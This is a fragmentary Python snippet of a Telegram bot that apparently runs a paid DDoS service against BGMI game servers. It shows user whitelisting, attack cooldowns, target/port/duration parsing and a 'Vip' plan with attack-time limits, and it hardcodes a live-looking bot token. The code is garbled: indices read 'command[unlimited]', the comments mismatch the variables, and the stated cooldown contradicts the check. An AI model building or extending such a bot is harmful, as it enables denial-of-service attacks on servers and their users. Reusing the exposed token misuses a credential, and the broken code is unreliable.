...
bot = telebot.TeleBot('7399756238:AAFnM3X54F8ww_osL_wmjb1TJOqvLwQxKhY')
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "𝙔𝙊𝙐 𝘼𝙍𝙀 𝙊𝙉 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉 𝙒𝘼𝙄𝙏 3 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ⏳"
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[unlimited]
            port = int(command[unlimited])  # Convert time to integer
            time = int(command[unlimited])  # Convert port to integer
            if time > 500:
...
Vip :
-> Attack Time : 500 (Second)
> After Attack Limit : 10 (minute)
-> Concurrents Attack : 0 (second)
